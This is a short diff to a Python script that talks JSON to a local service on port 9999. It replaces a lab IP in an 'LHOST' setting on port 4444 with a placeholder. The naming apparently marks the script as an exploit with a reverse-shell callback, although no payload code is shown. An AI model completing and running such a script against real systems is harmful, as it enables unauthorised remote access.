@@ -6,7 +6,7 @@ import base64
 
 HOST = "127.0.0.1"
 PORT = 9999
-LHOST = ("192.168.141.128", 4444)
+LHOST = ("ip", 4444)
 
 def send_json(sock, obj):
     data = json.dumps(obj).encode()
@@ -86,3 +86,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
